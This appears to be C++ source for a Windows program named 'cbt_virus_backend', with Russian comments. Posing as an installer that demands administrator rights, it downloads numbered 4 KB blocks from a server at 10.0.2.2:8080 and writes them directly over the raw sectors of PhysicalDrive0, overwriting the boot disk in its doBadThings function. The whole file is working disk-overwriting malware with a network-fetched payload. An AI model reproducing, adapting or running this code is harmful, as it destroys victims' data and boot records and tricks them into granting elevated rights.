// cbt_virus_backend.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"

#define SERVER_NAME L"10.0.2.2"
#define SERVER_PORT 8080
#define SERVER_PORT_STR L"8080"

#define FAIL_IF_FALSE(x) {if((x) == false) {printf("error %d @ line %d\n", GetLastError(), __LINE__);return;}}

void getDataFromInternet(LPCWSTR requestURL, char *buffer, unsigned int bufferSize)
{
	HINTERNET hInternet = InternetOpen(TEXT("uh oh stinky"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	FAIL_IF_FALSE(hInternet != NULL)
	HINTERNET hConnect = InternetConnect(hInternet, SERVER_NAME, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	FAIL_IF_FALSE(hConnect != NULL);
	HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", requestURL, NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 1);
	FAIL_IF_FALSE(hRequest != NULL);
	FAIL_IF_FALSE(HttpSendRequest(hRequest, NULL, 0, NULL, 0) != 0);
	DWORD dwByteRead;
	FAIL_IF_FALSE(InternetReadFile(hRequest, buffer, bufferSize, &dwByteRead) && dwByteRead != 0);
}

// Gets amount of data from server
unsigned int getBlockAmount()
{
	char *nBuffer = (char *) calloc(32, sizeof(char));
	getDataFromInternet(L"amountOfBlocks", nBuffer, 32);
	int result = StrToIntA((LPCSTR) nBuffer);
	assert(result > 0);
	free(nBuffer);
	return result;
}

// Downloads 4k block of data
void downloadBlock(int n, char *buffer)
{
	wchar_t nBuffer[32];
	_itow_s(n, nBuffer, 32, 10);
	wchar_t *baseRequestURL = (wchar_t *) calloc(39, sizeof(wchar_t));
	LPCWSTR requestURL;
	requestURL = lstrcat((LPWSTR) baseRequestURL, L"blocks/");
	assert(requestURL != NULL);
	requestURL = lstrcat((LPWSTR) baseRequestURL, nBuffer);
	assert(requestURL != NULL);
	getDataFromInternet(requestURL, buffer, 4096);
	free(baseRequestURL);
}

void doBadThings()
{
	char value = 0;
	HANDLE f = CreateFile(
		TEXT("\\\\.\\PhysicalDrive0"),
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	assert(f != NULL);

	unsigned int amountOfBlocks = getBlockAmount();
	char *buffer = (char *) calloc(4096, sizeof(char));
	DWORD dwBytesWritten = 0;
	for (unsigned int i = 0; i < amountOfBlocks; i++)
	{
		downloadBlock(i, buffer);
#ifndef _DEBUG
		//fwrite(buffer, 1, 4096, f);
		WriteFile(f, buffer, 4096, &dwBytesWritten, NULL);
#endif
		FAIL_IF_FALSE(dwBytesWritten > 0)
		FAIL_IF_FALSE(SetFilePointer(f, 4096, NULL, FILE_CURRENT) != INVALID_SET_FILE_POINTER);
	}
	free(buffer);
	CloseHandle(f);

	MessageBoxA(
		NULL,
		(LPCSTR) buffer,
		(LPCSTR) "Success",
		MB_ICONINFORMATION | MB_OK | MB_DEFBUTTON1);
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (!IsUserAnAdmin())
	{
		MessageBox(
			NULL,
			(LPCWSTR)L"Please, run this installer as an administraton!",
			(LPCWSTR)L"Error",
			MB_ICONERROR | MB_OK | MB_DEFBUTTON1);
		return 1;
	}

	doBadThings();

	return 0;
}

